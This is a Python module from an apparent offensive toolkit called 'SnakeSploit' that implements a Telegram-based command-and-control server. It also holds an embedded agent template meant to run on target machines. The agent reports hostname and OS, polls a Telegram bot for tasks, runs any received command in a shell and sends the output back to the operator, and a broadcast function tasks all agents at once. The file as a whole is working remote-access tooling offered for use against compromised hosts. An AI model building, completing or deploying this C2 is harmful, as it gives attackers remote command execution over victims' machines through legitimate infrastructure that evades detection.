"""
SnakeSploit Telegram C2 — Command & Control over Telegram Bot API.
Agents communicate via Telegram messages. Operator controls everything
through the SnakeSploit console.

How it works:
  1. Create a Telegram bot via @BotFather → get a token
  2. Start Telegram C2 in SnakeSploit
  3. Deploy the Telegram agent on the target
  4. Agent polls Telegram for tasks, sends results back
  5. Command and control over Telegram infrastructure (no VPS needed)
"""

import json
import os
import threading
import time
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Any
from datetime import datetime
from dataclasses import dataclass, field

C2_DIR = os.path.expanduser("~/.snakesploit/c2")
TELEGRAM_C2_DIR = os.path.join(C2_DIR, "telegram")
os.makedirs(TELEGRAM_C2_DIR, exist_ok=True)

POLL_INTERVAL = 3  # seconds between polling Telegram for new messages
AGENT_POLL_INTERVAL = 5  # seconds between agent task checks


@dataclass
class TelegramAgent:
    """A C2 agent communicating via Telegram."""
    chat_id: int
    username: str = ""
    first_seen: str = ""
    last_seen: str = ""
    hostname: str = "unknown"
    os_info: str = "unknown"
    tasks: List[dict] = field(default_factory=list)
    results: List[str] = field(default_factory=list)
    dead: bool = False

    def to_dict(self) -> dict:
        return {
            "chat_id": self.chat_id,
            "username": self.username,
            "hostname": self.hostname,
            "os": self.os_info,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "tasks_count": len(self.tasks),
            "dead": self.dead,
        }


class TelegramC2:
    """Telegram-based C2 server — uses Telegram Bot API for agent communication."""

    def __init__(self, bot_token: str = ""):
        self.bot_token = bot_token
        self.api_base = ""
        self.agents: Dict[int, TelegramAgent] = {}
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None
        self._last_update_id = 0
        self._operator_chat_id: Optional[int] = None
        self._lock = threading.Lock()
        self._load_state()

    def _state_path(self) -> str:
        return os.path.join(TELEGRAM_C2_DIR, "telegram_c2_state.json")

    def _load_state(self):
        path = self._state_path()
        if os.path.exists(path):
            try:
                with open(path) as f:
                    state = json.load(f)
                self.bot_token = state.get("bot_token", self.bot_token)
                self._last_update_id = state.get("last_update_id", 0)
                self._operator_chat_id = state.get("operator_chat_id")
                for data in state.get("agents", []):
                    agent = TelegramAgent(chat_id=data["chat_id"])
                    for k, v in data.items():
                        if hasattr(agent, k):
                            setattr(agent, k, v)
                    self.agents[agent.chat_id] = agent
            except Exception:
                pass

    def _save_state(self):
        state = {
            "bot_token": self.bot_token,
            "last_update_id": self._last_update_id,
            "operator_chat_id": self._operator_chat_id,
            "agents": [a.to_dict() for a in self.agents.values()],
        }
        with open(self._state_path(), "w") as f:
            json.dump(state, f, indent=2)

    def configure(self, bot_token: str):
        """Configure the Telegram bot token."""
        self.bot_token = bot_token
        self.api_base = "https://api.telegram.org/bot%s" % bot_token
        self._save_state()

    def _api(self, method: str, params: dict = None) -> Optional[dict]:
        """Call Telegram Bot API."""
        if not self.bot_token or not self.api_base:
            return None
        url = "%s/%s" % (self.api_base, method)
        if params:
            data = urllib.parse.urlencode(params).encode()
        else:
            data = None
        try:
            req = urllib.request.Request(url, data=data)
            with urllib.request.urlopen(req, timeout=10) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"ok": False, "error": "HTTP %d: %s" % (e.code, e.reason)}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def start(self) -> dict:
        """Start the Telegram C2 polling loop."""
        if not self.bot_token:
            return {"success": False, "error": "No bot token configured. Use 'c2 telegram config TOKEN' first."}

        # Verify the bot token by getting bot info
        me = self._api("getMe")
        if not me or not me.get("ok"):
            return {"success": False, "error": "Invalid bot token or Telegram API unreachable."}

        bot_name = me.get("result", {}).get("username", "unknown")
        self._running = True

        # Start polling thread
        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._poll_thread.start()

        self._save_state()

        return {
            "success": True,
            "message": "Telegram C2 started. Bot: @%s" % bot_name,
            "bot_username": bot_name,
        }

    def stop(self):
        """Stop the Telegram C2 polling."""
        self._running = False
        if self._poll_thread:
            self._poll_thread.join(timeout=5)
        self._save_state()

    def _poll_loop(self):
        """Poll Telegram for new messages (commands from operator, check-ins from agents)."""
        while self._running:
            try:
                params = {
                    "timeout": 10,
                    "offset": self._last_update_id + 1,
                }
                result = self._api("getUpdates", params)
                if result and result.get("ok"):
                    for update in result.get("result", []):
                        self._process_update(update)
                        if update.get("update_id", 0) > self._last_update_id:
                            self._last_update_id = update["update_id"]
                    self._save_state()
            except Exception:
                pass
            time.sleep(POLL_INTERVAL)

    def _process_update(self, update: dict):
        """Process a single Telegram update."""
        message = update.get("message") or update.get("channel_post") or {}
        chat = message.get("chat", {})
        chat_id = chat.get("id")
        text = (message.get("text") or "").strip()
        username = chat.get("username") or chat.get("first_name") or "unknown"

        if not chat_id or not text:
            return

        # Register the sender as an agent if not known
        with self._lock:
            if chat_id not in self.agents:
                self.agents[chat_id] = TelegramAgent(
                    chat_id=chat_id,
                    username=username,
                    first_seen=datetime.now().isoformat(),
                    last_seen=datetime.now().isoformat(),
                )
                self._send_message(chat_id, "REGISTERED:%d" % chat_id)
            else:
                self.agents[chat_id].last_seen = datetime.now().isoformat()

        # Process the message
        if text.upper().startswith("CHECKIN:"):
            # Agent check-in with system info
            info = text[8:].strip()
            parts = info.split("|")
            with self._lock:
                agent = self.agents[chat_id]
                if len(parts) > 0:
                    agent.hostname = parts[0]
                if len(parts) > 1:
                    agent.os_info = parts[1]
                agent.last_seen = datetime.now().isoformat()

        elif text.upper().startswith("RESULT:"):
            # Agent returning command output
            output = text[7:].strip()
            with self._lock:
                agent = self.agents[chat_id]
                agent.results.append(output[:1000])
                agent.last_seen = datetime.now().isoformat()

        elif text.upper().startswith("TASK_DONE:"):
            # Agent confirming task completion
            pass

        else:
            # If it's the operator, treat as command. Otherwise, check-in.
            if self._operator_chat_id is None:
                self._operator_chat_id = chat_id
                self._send_message(chat_id, "Operator registered. Use 'task AGENT_ID cmd' to command agents.\nAgents: use CHECKIN:hostname|os to register.")

    def _send_message(self, chat_id: int, text: str) -> bool:
        """Send a message to a chat (agent or operator)."""
        result = self._api("sendMessage", {
            "chat_id": chat_id,
            "text": text,
        })
        return result is not None and result.get("ok", False)

    def task_agent(self, target_chat_id: int, command: str) -> dict:
        """Send a task/command to an agent via Telegram."""
        if target_chat_id not in self.agents:
            return {"success": False, "error": "Agent not found. Use 'c2 telegram list' to see agents."}

        task_msg = "TASK:%s" % command
        sent = self._send_message(target_chat_id, task_msg)

        if sent:
            with self._lock:
                agent = self.agents[target_chat_id]
                agent.tasks.append({
                    "command": command,
                    "sent_at": datetime.now().isoformat(),
                    "status": "sent",
                })
            self._save_state()
            return {"success": True, "message": "Task sent to agent %d" % target_chat_id}
        return {"success": False, "error": "Failed to send task via Telegram."}

    def get_agents(self) -> List[dict]:
        """Get all registered agents."""
        return [a.to_dict() for a in self.agents.values()]

    def broadcast(self, command: str) -> dict:
        """Send a command to ALL registered agents."""
        sent_count = 0
        for chat_id in list(self.agents.keys()):
            if self._send_message(chat_id, "TASK:%s" % command):
                sent_count += 1
        return {"success": True, "message": "Task sent to %d agents" % sent_count}

    def status(self) -> dict:
        """Get Telegram C2 status."""
        return {
            "running": self._running,
            "agents": len(self.agents),
            "bot_configured": bool(self.bot_token),
            "operator_chat_id": self._operator_chat_id,
            "last_update_id": self._last_update_id,
        }


# ── Telegram C2 Agent Template ──
# This is the code that runs on the target machine.
# It polls Telegram for tasks and sends results back.

TELEGRAM_AGENT_CODE = '''
import json
import os
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.parse

BOT_TOKEN = "%s"
API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
POLL_INTERVAL = 5  # seconds

def tg_api(method, params=None):
    url = API_BASE + "/" + method
    data = urllib.parse.urlencode(params or {}).encode()
    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except:
        return None

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "unknown"

def get_os():
    try:
        if sys.platform.startswith("win"):
            return "windows"
        return "linux"
    except:
        return "unknown"

# Register with C2
me = tg_api("getMe")
if not me or not me.get("ok"):
    print("[-] Telegram C2: Invalid bot token")
    sys.exit(1)

bot_name = me["result"]["username"]
print("[*] Telegram C2 agent starting. Bot: @" + bot_name)

# Send check-in
msg = tg_api("sendMessage", {
    "chat_id": "%s",
    "text": "CHECKIN:%s|%s" % (get_hostname(), get_os()),
})
if not msg or not msg.get("ok"):
    print("[-] Telegram C2: Could not register with server")
    sys.exit(1)

chat_id = msg["result"]["chat"]["id"]
print("[+] Registered with C2. Chat ID: " + str(chat_id))

last_update_id = 0

while True:
    try:
        updates = tg_api("getUpdates", {
            "timeout": 10,
            "offset": last_update_id + 1,
        })
        if updates and updates.get("ok"):
            for update in updates.get("result", []):
                if update.get("update_id", 0) > last_update_id:
                    last_update_id = update["update_id"]

                message = update.get("message", {})
                text = (message.get("text") or "").strip()

                if text.upper().startswith("TASK:"):
                    command = text[5:].strip()
                    print("[*] Executing: " + command)
                    try:
                        result = subprocess.run(
                            command, shell=True, capture_output=True, text=True, timeout=30
                        )
                        output = result.stdout + result.stderr
                        if not output:
                            output = "[OK]"
                    except subprocess.TimeoutExpired:
                        output = "[TIMEOUT]"
                    except Exception as e:
                        output = "[ERROR] " + str(e)

                    # Send result back
                    tg_api("sendMessage", {
                        "chat_id": chat_id,
                        "text": "RESULT:" + output[:500],
                    })
    except:
        pass

    time.sleep(POLL_INTERVAL)
'''


def generate_telegram_agent(bot_token: str, output_path: str = "") -> str:
    """Generate a Telegram C2 agent script for the target."""
    code = TELEGRAM_AGENT_CODE % (bot_token, "%s")

    if not output_path:
        output_path = os.path.join(TELEGRAM_C2_DIR, "telegram_agent.py")

    with open(output_path, "w") as f:
        f.write(code)

    return output_path